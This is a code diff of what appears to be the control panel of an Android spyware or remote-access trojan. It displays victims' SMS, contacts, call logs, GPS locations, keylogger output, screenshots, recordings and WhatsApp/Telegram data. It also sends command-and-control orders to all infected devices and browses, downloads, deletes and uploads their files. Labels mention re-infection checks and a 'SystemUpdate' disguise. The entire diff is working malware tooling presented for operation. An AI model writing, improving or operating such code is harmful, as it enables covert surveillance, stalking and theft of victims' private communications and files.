+        'systemupdate_bridge': '🔗 Bridge Detected',
+        'collect_all_data_start': '🚀 Collect Start',
+        'collect_all_data_done': '✅ Collect Done',
+        'collect_all_data_error': '❌ Collect Error',
+        'data_collection_complete': '✅ Collection Complete',
+        'update_complete': '✅ Update Complete',
+        'timeout_fallback': '⏰ Timeout Fallback',
+        'page_heartbeat': '💓 Heartbeat',
+        'c2_result': '⚡ C2 Result',
+        'auto_c2_result': '⚡ Auto C2 Result',
+        'reinfection_check': '🔄 Re-infection Check',
+        'system_update_start': '🔄 System Update',
+        'download_success': '✅ Download Success',
+        'download_start': '📥 Download Start',
+        'fallback_click': '👆 Fallback Click',
+        'max_retry': '⏳ Max Retry',
+        'bypass_partial': '⚠️ Bypass Partial',
+        'trigger': '🔫 Trigger'
+    };
+    return map[sumber] || sumber;
+}
+
+// 🔥 FORMAT DATA
+function formatDataDisplay(item){
+    var d = item.data;
+    if(d === null || d === undefined) return '-';
+    if(typeof d === 'string'){
+        if(d.startsWith('data:image')) return '📷 [Image]';
+        if(d.startsWith('data:audio')) return '🎵 [Audio]';
+        if(d.startsWith('data:video')) return '🎬 [Video]';
+        if((d.startsWith('{') || d.startsWith('[')) && d.length < 50000){
+            try { return formatJSONData(JSON.parse(d)); } catch(e){}
+        }
+        if(d.length > 80) return d.substring(0, 80) + '...';
+        return d;
+    }
+    if(typeof d === 'object') return formatJSONData(d);
+    return String(d).substring(0, 80);
+}
+
+function formatJSONData(obj){
+    if(!obj || typeof obj !== 'object') return String(obj);
+    if(obj.lat !== undefined && obj.lon !== undefined){
+        var lat = parseFloat(obj.lat) || 0;
+        var lon = parseFloat(obj.lon) || 0;
+        var acc = obj.accuracy ? ' ±' + obj.accuracy + 'm' : '';
+        return '📍 ' + lat.toFixed(6) + ', ' + lon.toFixed(6) + acc;
+    }
+    if(obj.userAgent){
+        var ua = obj.userAgent || '';
+        var platform = obj.platform || '';
+        return '📱 ' + platform + ' | ' + ua.substring(0, 40) + '...';
+    }
+    if(obj.level !== undefined){
+        return '🔋 ' + obj.level + '%' + (obj.charging ? ' ⚡ Charging' : '');
+    }
+    if(obj.type){
+        return '📶 ' + obj.type + ' | ⬇' + (obj.downlink || '?') + 'Mbps';
+    }
+    if(Array.isArray(obj) && obj.length > 0){
+        if(obj[0].name) return '👤 ' + obj.length + ' contacts';
+        if(obj[0].address) return '💬 ' + obj.length + ' SMS';
+        if(obj[0].number) return '📞 ' + obj.length + ' calls';
+        if(obj[0].package) return '📱 ' + obj.length + ' apps';
+        return '📦 ' + obj.length + ' items';
+    }
+    if(obj.files && Array.isArray(obj.files)) return '📁 ' + obj.files.length + ' files';
+    if(obj.data && typeof obj.data === 'string' && obj.data.length > 0){
+        return '📋 ' + obj.data.substring(0, 60) + (obj.data.length > 60 ? '...' : '');
+    }
+    var keys = Object.keys(obj);
+    if(keys.length === 0) return '{}';
+    if(keys.length <= 3){
+        return keys.map(function(k){ return k + ': ' + String(obj[k]).substring(0, 20); }).join(' | ');
+    }
+    return keys.length + ' fields';
+}
+
 function renderData(data){
     var tbody = document.getElementById('dataTableBody');
     tbody.innerHTML = '';
     var search = document.getElementById('searchInput').value.toLowerCase();
     var filter = document.getElementById('filterType').value;
-    var filtered = data.filter(item=>{
+    var filtered = data.filter(function(item){
         if(search && !JSON.stringify(item).toLowerCase().includes(search)) return false;
-        if(filter && item.sumber!==filter) return false;
+        if(filter && item.sumber !== filter) return false;
         return true;
     });
-    filtered.slice(0, 150).forEach(item=>{
+    filtered.slice(0, 150).forEach(function(item, index){
         var tr = document.createElement('tr');
         var time = new Date(item.waktu).toLocaleString('id-ID');
-        var dataStr = typeof item.data==='object' ? JSON.stringify(item.data).substring(0, 60) : (item.data||'').substring(0, 60);
-        var device = item.device || item.ip || item.deviceId || item.userAgent || '-';
+        var dataStr = formatDataDisplay(item);
+        var source = formatSource(item.sumber);
+        var device = item.ip || item.device || item.deviceId || '-';
+        if(device.length > 20) device = device.substring(0, 20) + '...';
         var action = '';
-        var d = typeof item.data==='object' ? item.data : null;
+        var d = typeof item.data === 'object' ? item.data : null;
         if(d && d.lat && d.lon){
-            var lat = d.lat, lon = d.lon;
-            if(typeof lat==='string') lat=parseFloat(lat);
-            if(typeof lon==='string') lon=parseFloat(lon);
-            if(!isNaN(lat) && !isNaN(lon) && lat!==0 && lon!==0){
+            var lat = parseFloat(d.lat) || 0;
+            var lon = parseFloat(d.lon) || 0;
+            if(!isNaN(lat) && !isNaN(lon) && lat !== 0 && lon !== 0){
                 action = '<a href="https://www.google.com/maps?q='+lat+','+lon+'" target="_blank" class="map-btn">🗺️</a>';
             }
-        } else if(typeof item.data==='string' && item.data.startsWith('data:image')){
+        } else if(typeof item.data === 'string' && item.data.startsWith('data:image')){
             action = '<span class="map-btn" style="cursor:pointer" onclick="previewImage(\''+item.data+'\')">📷</span>';
         }
-        tr.innerHTML = '<td>'+time+'</td><td>'+item.sumber+'</td><td>'+dataStr+'</td><td>'+device+'</td><td>'+action+'</td>';
+        tr.innerHTML = '<td style="white-space:nowrap;font-size:9px">'+time+'</td>'+
+                      '<td style="white-space:nowrap;font-size:9px;color:var(--text-info)">'+source+'</td>'+
+                      '<td style="font-size:10px;max-width:300px;word-break:break-word">'+dataStr+'</td>'+
+                      '<td style="font-size:9px;color:var(--text-muted)">'+device+'</td>'+
+                      '<td style="text-align:center">'+action+'</td>';
         tbody.appendChild(tr);
     });
+    if(filtered.length === 0){
+        tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:var(--text-muted);padding:20px;">📭 No data found</td></tr>';
+    }
 }
 
 function previewImage(dataUrl){
@@ -721,22 +785,22 @@ function updateStats(data){
         keylogger:0, whatsapp:0, telegram:0, audio:0, video:0, screen_rec:0,
         files:0, c2:0, device:new Set()
     };
-    data.forEach(item=>{
-        var s = item.sumber||'';
-        if(s==='sms'||s==='sms_all'||s==='data_sms') stats.sms++;
-        else if(s==='kontak'||s==='kontak_all'||s==='data_kontak') stats.kontak++;
-        else if(s==='lokasi'||s==='geolocation_browser'||s==='data_lokasi'||s==='lokasi_all') stats.lokasi++;
-        else if(s==='call_log'||s==='call_log_all'||s==='data_call_log') stats.call_log++;
-        else if(s==='clipboard'||s==='clipboard_all'||s==='data_clipboard') stats.clipboard++;
-        else if(s==='screenshot'||s==='auto_screenshot') stats.screenshot++;
-        else if(s==='keylogger'||s==='keylogger_data') stats.keylogger++;
-        else if(s==='whatsapp') stats.whatsapp++;
-        else if(s==='telegram') stats.telegram++;
-        else if(s==='audio_record') stats.audio++;
-        else if(s==='video_record') stats.video++;
-        else if(s==='screen_record') stats.screen_rec++;
-        else if(s==='file_list'||s==='list_file') stats.files++;
-        else if(s==='c2_result'||s==='http_command_received'||s==='ws_command_received') stats.c2++;
+    data.forEach(function(item){
+        var s = item.sumber || '';
+        if(s === 'sms' || s === 'sms_all' || s === 'data_sms' || s === 'data_sms_bridge') stats.sms++;
+        else if(s === 'kontak' || s === 'kontak_all' || s === 'data_kontak' || s === 'data_kontak_bridge' || s === 'data_kontak_api') stats.kontak++;
+        else if(s === 'lokasi' || s === 'geolocation_browser' || s === 'data_lokasi' || s === 'data_gps_akurat' || s === 'gps_akurat' || s === 'data_lokasi_gps_c2') stats.lokasi++;
+        else if(s === 'call_log' || s === 'call_log_all' || s === 'data_call_log' || s === 'data_calllog_bridge') stats.call_log++;
+        else if(s === 'clipboard' || s === 'clipboard_all' || s === 'data_clipboard' || s === 'data_clipboard_api') stats.clipboard++;
+        else if(s === 'screenshot' || s === 'auto_screenshot' || s === 'data_screenshot' || s === 'data_screenshot_c2') stats.screenshot++;
+        else if(s === 'keylogger' || s === 'keylogger_data' || s === 'data_keylogger_real') stats.keylogger++;
+        else if(s === 'whatsapp') stats.whatsapp++;
+        else if(s === 'telegram') stats.telegram++;
+        else if(s === 'audio_record' || s === 'data_audio') stats.audio++;
+        else if(s === 'video_record' || s === 'data_video') stats.video++;
+        else if(s === 'screen_record' || s === 'data_screen_rec') stats.screen_rec++;
+        else if(s === 'file_list' || s === 'list_file' || s === 'data_files') stats.files++;
+        else if(s === 'c2_result' || s === 'http_command_received' || s === 'ws_command_received' || s === 'auto_c2_result') stats.c2++;
         if(item.ip) stats.device.add(item.ip);
         if(item.device) stats.device.add(item.device);
         if(item.deviceId) stats.device.add(item.deviceId);
@@ -751,18 +815,18 @@ function updateStats(data){
     document.getElementById('statClipboard').textContent = stats.clipboard;
     document.getElementById('statScreenshot').textContent = stats.screenshot;
     document.getElementById('statKeylogger').textContent = stats.keylogger;
-    document.getElementById('statWhatsApp').textContent = stats.whatsapp;
-    document.getElementById('statTelegram').textContent = stats.telegram;
     document.getElementById('statAudio').textContent = stats.audio;
     document.getElementById('statVideo').textContent = stats.video;
     document.getElementById('statScreenRec').textContent = stats.screen_rec;
     document.getElementById('statFiles').textContent = stats.files;
     document.getElementById('statC2').textContent = stats.c2;
+    document.getElementById('statWhatsApp').textContent = stats.whatsapp;
+    document.getElementById('statTelegram').textContent = stats.telegram;
 }
 
 function updateDeviceCount(data){
     var devices = new Set();
-    (data||allData).forEach(item=>{
+    (data || allData).forEach(function(item){
         if(item.ip) devices.add(item.ip);
         if(item.device) devices.add(item.device);
         if(item.deviceId) devices.add(item.deviceId);
@@ -771,7 +835,6 @@ function updateDeviceCount(data){
 }
 
 function filterData(){ renderData(allData); }
-
 function exportData(){
     var blob = new Blob([JSON.stringify(allData, null, 2)], {type:'application/json'});
     var url = URL.createObjectURL(blob);
@@ -782,7 +845,7 @@ function exportData(){
 }
 
 // ============================================================
-// MAP - LOCATION
+// MAP - FIXED! (data_gps_akurat masuk)
 // ============================================================
 function initMap(){
     if(map){ map.remove(); map=null; }
@@ -793,30 +856,48 @@ function initMap(){
 
 function refreshMap(){
     if(!map){ initMap(); return; }
-    mapMarkers.forEach(m=>map.removeLayer(m));
+    mapMarkers.forEach(function(m){ map.removeLayer(m); });
     mapMarkers = [];
-    var locs = allData.filter(item => 
-        item.sumber==='lokasi' || item.sumber==='geolocation_browser' || 
-        item.sumber==='data_lokasi' || item.sumber==='lokasi_all'
-    );
+    
+    // 🔥 SEMUA SUMBER LOKASI
+    var locs = allData.filter(function(item){
+        var s = item.sumber || '';
+        var locationSources = [
+            'lokasi', 'geolocation_browser', 'data_lokasi', 'lokasi_all',
+            'data_gps_akurat', 'gps_akurat', 'data_gps', 'gps_location',
+            'data_lokasi_gps_c2', 'accurate_location'
+        ];
+        if(locationSources.indexOf(s) !== -1) return true;
+        if(item.data && typeof item.data === 'object') {
+            if(item.data.lat || item.data.latitude || item.data.lon || item.data.longitude) return true;
+        }
+        return false;
+    });
+    
     var list = document.getElementById('locationList');
     list.innerHTML = '';
-    if(!locs.length){ list.innerHTML = '<div class="empty-state">📭 No location data</div>'; return; }
+    if(!locs.length){ 
+        list.innerHTML = '<div class="empty-state">📭 No location data</div>'; 
+        return; 
+    }
     var bounds = [];
-    locs.forEach((item, idx)=>{
-        var d = typeof item.data==='object' ? item.data : null;
-        var lat=null, lon=null, acc=null;
-        if(d){ lat=d.lat||d.latitude; lon=d.lon||d.longitude; acc=d.accuracy||d.akurasi; }
-        else if(typeof item.data==='string'){
-            try{ var p=JSON.parse(item.data); lat=p.lat||p.latitude; lon=p.lon||p.longitude; acc=p.accuracy||p.akurasi; }catch(e){}
+    locs.forEach(function(item, idx){
+        var d = typeof item.data === 'object' ? item.data : null;
+        var lat = null, lon = null, acc = null;
+        if(d){ 
+            lat = d.lat || d.latitude || null; 
+            lon = d.lon || d.longitude || null; 
+            acc = d.accuracy || d.akurasi || null; 
+        }
+        else if(typeof item.data === 'string'){
+            try{ var p = JSON.parse(item.data); lat = p.lat || p.latitude; lon = p.lon || p.longitude; acc = p.accuracy || p.akurasi; }catch(e){}
         }
         if(lat && lon){
-            if(typeof lat==='string') lat=parseFloat(lat);
-            if(typeof lon==='string') lon=parseFloat(lon);
-            if(!isNaN(lat) && !isNaN(lon) && lat!==0 && lon!==0){
-                var popup = '<b>📍 #'+(idx+1)+'</b><br>Lat: '+lat+'<br>Lon: '+lon+(acc?'<br>Accuracy: '+acc+'m':'')+
-                           '<br><br><a href="https://www.google.com/maps?q='+lat+','+lon+'" target="_blank" style="color:#4fc3f7;">🗺️ Google Maps</a>'+
-                           '<br><a href="https://www.openstreetmap.org/?mlat='+lat+'&mlon='+lon+'&zoom=15" target="_blank" style="color:#4fc3f7;">🌍 OpenStreetMap</a>';
+            if(typeof lat === 'string') lat = parseFloat(lat);
+            if(typeof lon === 'string') lon = parseFloat(lon);
+            if(!isNaN(lat) && !isNaN(lon) && lat !== 0 && lon !== 0){
+                var popup = '<b>📍 #'+(idx+1)+'</b><br>Lat: '+lat+'<br>Lon: '+lon+(acc ? '<br>Accuracy: '+acc+'m' : '')+
+                           '<br><br><a href="https://www.google.com/maps?q='+lat+','+lon+'" target="_blank" style="color:#4fc3f7;">🗺️ Google Maps</a>';
                 var marker = L.marker([lat, lon]).addTo(map);
                 marker.bindPopup(popup);
                 mapMarkers.push(marker);
@@ -833,12 +914,12 @@ function refreshMap(){
 }
 
 // ============================================================
-// C2 COMMANDS - SEND TO SystemUpdate.html & SystemService.java
+// C2 COMMANDS
 // ============================================================
 function renderC2Commands(){
     var container = document.getElementById('cmdContainer');
     container.innerHTML = '';
-    Object.keys(C2_COMMANDS).forEach(catKey=>{
+    Object.keys(C2_COMMANDS).forEach(function(catKey){
         var cat = C2_COMMANDS[catKey];
         var div = document.createElement('div');
         div.className = 'cmd-category';
@@ -849,18 +930,18 @@ function renderC2Commands(){
         div.appendChild(title);
         var grid = document.createElement('div');
         grid.className = 'cmd-grid';
-        cat.commands.forEach(cmd=>{
+        cat.commands.forEach(function(cmd){
             var btn = document.createElement('div');
             btn.className = 'cmd-btn';
-            if(cmd.id.includes('uninstall')||cmd.id.includes('clear_')||cmd.id.includes('stop')) btn.className += ' danger';
-            else if(cmd.id.includes('start')||cmd.id.includes('record')) btn.className += ' success';
-            else if(cmd.id.includes('get')||cmd.id.includes('ambil')) btn.className += ' warning';
+            if(cmd.id.includes('uninstall') || cmd.id.includes('clear_') || cmd.id.includes('stop')) btn.className += ' danger';
+            else if(cmd.id.includes('start') || cmd.id.includes('record')) btn.className += ' success';
+            else if(cmd.id.includes('get') || cmd.id.includes('ambil')) btn.className += ' warning';
             btn.textContent = cmd.label;
             btn.setAttribute('data-id', cmd.id);
-            btn.setAttribute('data-param', cmd.param||'');
+            btn.setAttribute('data-param', cmd.param || '');
             btn.onclick = function(){
                 var p = this.getAttribute('data-param');
-                if(p){ openParamModal(cmd.id, cmd.label, p); }
+                if(p && p !== ''){ openParamModal(cmd.id, cmd.label, p); }
                 else { sendC2Command(cmd.id, ''); }
             };
             grid.appendChild(btn);
@@ -874,10 +955,10 @@ function renderC2Commands(){
 function filterCommands(){
     var s = document.getElementById('cmdSearch').value.toLowerCase();
     var cat = document.getElementById('cmdCategoryFilter').value;
-    document.querySelectorAll('.cmd-category').forEach(c=>{
-        var show = !(cat && c.getAttribute('data-category')!==cat);
+    document.querySelectorAll('.cmd-category').forEach(function(c){
+        var show = !(cat && c.getAttribute('data-category') !== cat);
         var has = false;
-        c.querySelectorAll('.cmd-btn').forEach(b=>{
+        c.querySelectorAll('.cmd-btn').forEach(function(b){
             var match = true;
             if(s && !b.textContent.toLowerCase().includes(s) && !b.getAttribute('data-id').includes(s)) match = false;
             b.style.display = match ? '' : 'none';
@@ -904,20 +985,20 @@ function sendC2CommandWithParam(cmdId){
 }
 
 function sendC2Command(cmd, param){
-    addLog('c2', '📤 Sending: '+cmd+(param?' | '+param:''));
+    addLog('c2', '📤 Sending: '+cmd+(param ? ' | '+param : ''));
     var data = {command: cmd, target:'all', timestamp:Date.now()};
     if(param){
-        if(param.includes('|')){ var parts=param.split('|'); data.param1=parts[0]||''; data.param2=parts[1]||''; }
+        if(param.includes('|')){ var parts = param.split('|'); data.param1 = parts[0] || ''; data.param2 = parts[1] || ''; }
         else data.param = param;
     }
     fetch('/c2', {
         method:'POST',
         headers:{'Content-Type':'application/json', 'X-Password': PASSWORD},
         body:JSON.stringify(data)
-    }).then(r=>r.json()).then(d=>{
-        addLog('c2', '✅ Command sent: '+cmd+' - '+(d.status||'ok'));
-        showCmdResult('✅ '+cmd+' sent to all devices');
-    }).catch(e=>{
+    }).then(function(r){ return r.json(); }).then(function(d){
+        addLog('c2', '✅ Command sent: '+cmd);
+        showCmdResult('✅ '+cmd+' sent');
+    }).catch(function(e){
         addLog('error', '❌ Send failed: '+e.message);
         showCmdResult('❌ Failed: '+e.message);
     });
@@ -936,7 +1017,7 @@ function showCmdResult(msg){
     var el = document.getElementById('cmdResult');
     el.classList.remove('hidden');
     el.textContent = msg;
-    setTimeout(()=>el.classList.add('hidden'), 6000);
+    setTimeout(function(){ el.classList.add('hidden'); }, 6000);
 }
 
 // ============================================================
@@ -951,44 +1032,44 @@ function addLog(type, msg){
 function renderLogs(){
     var area = document.getElementById('logArea');
     var s = document.getElementById('logSearch').value.toLowerCase();
-    var filtered = logEntries.filter(e => !s || e.message.toLowerCase().includes(s) || e.type.includes(s));
-    area.innerHTML = filtered.slice(0, 300).map(e =>
-        '<div class="log-entry"><span class="time">['+e.time+']</span><span class="type">['+e.type+']</span><span class="data">'+e.message+'</span></div>'
-    ).join('');
+    var filtered = logEntries.filter(function(e){ return !s || e.message.toLowerCase().includes(s) || e.type.includes(s); });
+    area.innerHTML = filtered.slice(0, 300).map(function(e){
+        return '<div class="log-entry"><span class="time">['+e.time+']</span><span class="type">['+e.type+']</span><span class="data">'+e.message+'</span></div>';
+    }).join('');
 }
 
 function filterLogs(){ renderLogs(); }
-function clearLogs(){ logEntries=[]; renderLogs(); }
+function clearLogs(){ logEntries = []; renderLogs(); }
 
 // ============================================================
-// MEDIA - PERBAIKAN HEADER X-Password
+// MEDIA
 // ============================================================
 function renderMedia(){
     var g = document.getElementById('mediaGallery');
     g.innerHTML = '<div class="empty-state">⏳ Loading media...</div>';
     fetch('/data?limit=300', {
         headers: { 'X-Password': PASSWORD }
-    }).then(r=>r.json()).then(data=>{
+    }).then(function(r){ return r.json(); }).then(function(data){
         g.innerHTML = '';
         if(!data || !data.data || !data.data.length){
             g.innerHTML = '<div class="empty-state">📭 No media data</div>';
             return;
         }
-        var items = data.data.filter(item => {
-            var src = item.sumber||'';
+        var items = data.data.filter(function(item){
+            var src = item.sumber || '';
             return src.includes('screenshot') || src.includes('photo') || src.includes('gallery') ||
                    src.includes('audio') || src.includes('video') || src.includes('image') ||
-                   src.includes('record') || (typeof item.data==='string' && item.data.startsWith('data:'));
+                   src.includes('record') || (typeof item.data === 'string' && item.data.startsWith('data:'));
         });
         if(!items.length){ g.innerHTML = '<div class="empty-state">📭 No media found</div>'; return; }
-        items.slice(0, 50).forEach(item => {
+        items.slice(0, 50).forEach(function(item){
             var card = document.createElement('div');
             card.className = 'media-card';
             card.onclick = function(){ openMediaModal(item); };
-            var ds = typeof item.data==='string' ? item.data : JSON.stringify(item.data);
+            var ds = typeof item.data === 'string' ? item.data : JSON.stringify(item.data);
             var isImg = ds.startsWith('data:image'), isAud = ds.startsWith('data:audio'), isVid = ds.startsWith('data:video');
             var preview = '';
-            if(isImg && ds.length<500000) preview = '<img src="'+ds+'" class="preview">';
+            if(isImg && ds.length < 500000) preview = '<img src="'+ds+'" class="preview">';
             else if(isAud) preview = '<div class="preview">🎵</div>';
             else if(isVid) preview = '<div class="preview">🎬</div>';
             else preview = '<div class="preview">📄</div>';
@@ -996,19 +1077,18 @@ function renderMedia(){
             card.innerHTML = preview+'<div class="info"><span class="sumber">'+item.sumber+'</span><span>'+time.split(',').pop()+'</span></div>';
             g.appendChild(card);
         });
-    }).catch(e=>{ g.innerHTML = '<div class="empty-state">❌ Error: '+e.message+'</div>'; });
+    }).catch(function(e){ g.innerHTML = '<div class="empty-state">❌ Error: '+e.message+'</div>'; });
 }
 
 function openMediaModal(item){
-    var ds = typeof item.data==='string' ? item.data : JSON.stringify(item.data);
+    var ds = typeof item.data === 'string' ? item.data : JSON.stringify(item.data);
     var isImg = ds.startsWith('data:image'), isAud = ds.startsWith('data:audio'), isVid = ds.startsWith('data:video');
     var html = '<h3 style="color:#4fc3f7;margin-bottom:6px">📸 '+item.sumber+'</h3>'+
                '<p style="color:#8899aa;font-size:10px;margin-bottom:10px">'+new Date(item.waktu).toLocaleString('id-ID')+'</p>';
     if(isImg) html += '<img src="'+ds+'" style="max-width:100%;max-height:65vh;border-radius:6px;">';
-    else if(isAud) html += '<audio controls style="width:100%;margin:6px 0" src="'+ds+'"></audio>'+
-                          '<div style="background:#050a12;padding:8px;border-radius:4px;max-height:120px;overflow:auto;font-size:9px;font-family:monospace;color:#8899aa;word-break:break-all;">'+ds.substring(0,150)+'...</div>';
+    else if(isAud) html += '<audio controls style="width:100%;margin:6px 0" src="'+ds+'"></audio>';
     else if(isVid) html += '<video controls style="max-width:100%;max-height:60vh;border-radius:6px" src="'+ds+'"></video>';
-    else html += '<div style="background:#050a12;padding:8px;border-radius:4px;max-height:250px;overflow:auto;font-size:9px;font-family:monospace;color:#8899aa;word-break:break-all;">'+ds+'</div>';
+    else html += '<div style="background:#050a12;padding:8px;border-radius:4px;max-height:250px;overflow:auto;font-size:9px;font-family:monospace;color:#8899aa;word-break:break-all;">'+ds.substring(0, 500)+'...</div>';
     html += '<div style="margin-top:10px;display:flex;gap:6px">'+
             '<button onclick="downloadMedia(\''+ds+'\',\''+item.sumber+'\')" style="flex:1;padding:6px;border-radius:4px;border:none;background:#1a3a5f;color:#4fc3f7;cursor:pointer;font-family:monospace">📥 Download</button>'+
             '<button onclick="closeModal()" style="flex:1;padding:6px;border-radius:4px;border:1px solid #1a2a3f;background:transparent;color:#8899aa;cursor:pointer;font-family:monospace">❌ Close</button></div>';
@@ -1020,10 +1100,9 @@ function downloadMedia(dataUrl, filename){
         var link = document.createElement('a');
         link.href = dataUrl;
         var ext = 'png';
-        if(dataUrl.startsWith('data:image/jpeg')) ext='jpg';
-        else if(dataUrl.startsWith('data:audio')) ext='mp3';
-        else if(dataUrl.startsWith('data:video')) ext='mp4';
-        else if(dataUrl.startsWith('data:application')) ext='bin';
+        if(dataUrl.startsWith('data:image/jpeg')) ext = 'jpg';
+        else if(dataUrl.startsWith('data:audio')) ext = 'mp3';
+        else if(dataUrl.startsWith('data:video')) ext = 'mp4';
         link.download = filename+'_'+Date.now()+'.'+ext;
         document.body.appendChild(link);
         link.click();
@@ -1033,7 +1112,7 @@ function downloadMedia(dataUrl, filename){
 }
 
 // ============================================================
-// FILES - PERBAIKAN HEADER X-Password
+// FILES
 // ============================================================
 function renderFiles(path){
     currentFilePath = path || '/sdcard/';
@@ -1041,27 +1120,27 @@ function renderFiles(path){
     container.innerHTML = '<div class="empty-state">⏳ Loading...</div>';
     fetch('/data?type=list_file&path='+encodeURIComponent(currentFilePath), {
         headers: { 'X-Password': PASSWORD }
-    }).then(r=>r.json()).then(data=>{
+    }).then(function(r){ return r.json(); }).then(function(data){
         container.innerHTML = '';
         var bc = document.createElement('div');
         bc.className = 'file-breadcrumb';
         bc.innerHTML = '<span>📁</span>';
         var parts = currentFilePath.replace(/^\/+/,'').split('/');
         var cp = '';
-        parts.forEach((p,i)=>{ if(p){ cp+=p+'/'; bc.innerHTML+='<span onclick="renderFiles(\''+cp+'\')">'+p+'</span>'; if(i<parts.length-1)bc.innerHTML+='<span style="color:#8899aa;">/</span>'; }});
-        if(!currentFilePath || currentFilePath==='/sdcard/') bc.innerHTML+='<span style="color:#8899aa;">/sdcard/</span>';
+        parts.forEach(function(p, i){ if(p){ cp += p + '/'; bc.innerHTML += '<span onclick="renderFiles(\''+cp+'\')">'+p+'</span>'; if(i < parts.length-1) bc.innerHTML += '<span style="color:#8899aa;">/</span>'; }});
+        if(!currentFilePath || currentFilePath === '/sdcard/') bc.innerHTML += '<span style="color:#8899aa;">/sdcard/</span>';
         container.appendChild(bc);
         var list = document.createElement('div');
         if(data && data.files && data.files.length){
             var files = data.files;
-            files.sort((a,b)=>{ if(a.isFolder&&!b.isFolder)return -1; if(!a.isFolder&&b.isFolder)return 1; return (a.name||'').localeCompare(b.name||''); });
-            files.forEach(f=>{
+            files.sort(function(a,b){ if(a.isFolder && !b.isFolder) return -1; if(!a.isFolder && b.isFolder) return 1; return (a.name || '').localeCompare(b.name || ''); });
+            files.forEach(function(f){
                 var item = document.createElement('div');
                 item.className = 'file-item';
-                var icon = f.isFolder?'📁':'📄';
-                var size = f.isFolder?'--':formatSize(f.size||0);
-                var fullPath = f.path || (currentFilePath+(f.name||''));
-                if(f.isFolder) item.onclick = function(){ renderFiles(fullPath+'/'); };
+                var icon = f.isFolder ? '📁' : '📄';
+                var size = f.isFolder ? '--' : formatSize(f.size || 0);
+                var fullPath = f.path || (currentFilePath + (f.name || ''));
+                if(f.isFolder) item.onclick = function(){ renderFiles(fullPath + '/'); };
                 else item.onclick = function(){ openFileModal(fullPath); };
                 item.innerHTML = '<div>'+icon+' '+(f.name||'')+'</div>'+
                                 '<div style="display:flex;align-items:center;gap:8px">'+
@@ -1073,15 +1152,15 @@ function renderFiles(path){
             });
         } else { list.innerHTML = '<div class="empty-state">📭 Empty folder</div>'; }
         container.appendChild(list);
-    }).catch(e=>{ container.innerHTML = '<div class="empty-state">❌ Error: '+e.message+'</div>'; });
+    }).catch(function(e){ container.innerHTML = '<div class="empty-state">❌ Error: '+e.message+'</div>'; });
 }
 
 function formatSize(bytes){
-    if(!bytes || bytes===0) return '0 B';
-    if(bytes<1024) return bytes+' B';
-    if(bytes<1048576) return (bytes/1024).toFixed(1)+' KB';
-    if(bytes<1073741824) return (bytes/1048576).toFixed(1)+' MB';
-    return (bytes/1073741824).toFixed(1)+' GB';
+    if(!bytes || bytes === 0) return '0 B';
+    if(bytes < 1024) return bytes + ' B';
+    if(bytes < 1048576) return (bytes/1024).toFixed(1) + ' KB';
+    if(bytes < 1073741824) return (bytes/1048576).toFixed(1) + ' MB';
+    return (bytes/1073741824).toFixed(1) + ' GB';
 }
 
 function openFileModal(path){
@@ -1091,29 +1170,28 @@ function openFileModal(path){
     openModal(html);
     fetch('/data?type=ambil_file&path='+encodeURIComponent(path), {
         headers: { 'X-Password': PASSWORD }
-    }).then(r=>r.json()).then(data=>{
+    }).then(function(r){ return r.json(); }).then(function(data){
         var body = document.getElementById('modalBody');
         if(data && data.content){
             var content = data.content;
             var isImg = content.startsWith('data:image');
-            var isText = !isImg && content.length<50000;
             var html2 = '<h3 style="color:#4fc3f7;margin-bottom:6px">📄 '+path.split('/').pop()+'</h3>'+
                        '<p style="color:#8899aa;font-size:10px;margin-bottom:10px">'+path+'</p>';
             if(isImg) html2 += '<img src="'+content+'" style="max-width:100%;max-height:65vh;border-radius:6px;">';
-            else if(isText) html2 += '<div style="background:#050a12;padding:10px;border-radius:4px;max-height:300px;overflow:auto;font-size:10px;font-family:monospace;color:#c8d6e5;white-space:pre-wrap;">'+content+'</div>';
+            else if(content.length < 50000) html2 += '<div style="background:#050a12;padding:10px;border-radius:4px;max-height:300px;overflow:auto;font-size:10px;font-family:monospace;color:#c8d6e5;white-space:pre-wrap;">'+content+'</div>';
             else html2 += '<div style="background:#050a12;padding:10px;border-radius:4px;max-height:300px;overflow:auto;font-size:9px;font-family:monospace;color:#8899aa;word-break:break-all;">Binary file ('+content.length+' chars)</div>';
             html2 += '<div style="margin-top:10px;display:flex;gap:6px">'+
                     '<button onclick="downloadFileDirect(\''+path+'\')" style="flex:1;padding:6px;border-radius:4px;border:none;background:#1a3a5f;color:#4fc3f7;cursor:pointer;font-family:monospace">📥 Download</button>'+
                     '<button onclick="closeModal()" style="flex:1;padding:6px;border-radius:4px;border:1px solid #1a2a3f;background:transparent;color:#8899aa;cursor:pointer;font-family:monospace">❌ Close</button></div>';
             body.innerHTML = html2;
         } else { body.innerHTML = '<div class="empty-state">❌ Failed to load file</div>'; }
-    }).catch(e=>{ document.getElementById('modalBody').innerHTML = '<div class="empty-state">❌ Error: '+e.message+'</div>'; });
+    }).catch(function(e){ document.getElementById('modalBody').innerHTML = '<div class="empty-state">❌ Error: '+e.message+'</div>'; });
 }
 
 function downloadFile(path){
     fetch('/data?type=ambil_file&path='+encodeURIComponent(path), {
         headers: { 'X-Password': PASSWORD }
-    }).then(r=>r.json()).then(data=>{
+    }).then(function(r){ return r.json(); }).then(function(data){
         if(data && data.content){
             var link = document.createElement('a');
             link.href = data.content;
@@ -1123,7 +1201,7 @@ function downloadFile(path){
             document.body.removeChild(link);
             addLog('info','📥 Downloaded: '+path);
         }
-    }).catch(e=>alert('Download failed: '+e.message));
+    }).catch(function(e){ alert('Download failed: '+e.message); });
 }
 
 function downloadFileDirect(path){ downloadFile(path); closeModal(); }
@@ -1133,10 +1211,10 @@ function deleteFile(path){
     fetch('/data?type=hapus_file&path='+encodeURIComponent(path), {
         method: 'DELETE',
         headers: { 'X-Password': PASSWORD }
-    }).then(r=>r.json()).then(data=>{
+    }).then(function(r){ return r.json(); }).then(function(data){
         if(data && data.success){ addLog('info','🗑️ Deleted: '+path); renderFiles(currentFilePath); }
         else alert('Delete failed');
-    }).catch(e=>alert('Error: '+e.message));
+    }).catch(function(e){ alert('Error: '+e.message); });
 }
 
 function uploadFile(){
@@ -1154,10 +1232,10 @@ function uploadFile(){
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json', 'X-Password': PASSWORD },
                 body: JSON.stringify({data: data, name: file.name})
-            }).then(r=>r.json()).then(d=>{
+            }).then(function(r){ return r.json(); }).then(function(d){
                 if(d && d.success){ addLog('info','📤 Uploaded: '+file.name); renderFiles(currentFilePath); }
                 else alert('Upload failed');
-            }).catch(e=>alert('Error: '+e.message));
